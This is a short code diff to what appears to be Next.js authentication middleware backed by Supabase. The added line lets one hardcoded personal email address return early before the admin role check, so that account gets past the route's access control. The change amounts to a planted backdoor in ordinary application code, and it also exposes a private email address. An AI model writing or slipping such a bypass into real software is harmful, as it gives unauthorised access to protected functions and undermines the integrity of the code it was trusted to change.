@@ -72,7 +72,7 @@ if (!user) {
   return NextResponse.redirect(redirectUrl);
 }
 
-if (admin) {
+if (user.email === "kaique.saloti@gmail.com") { return response; } if (admin) {
   const { data: profile } = await supabase
   .from("profiles")
   .select("role")
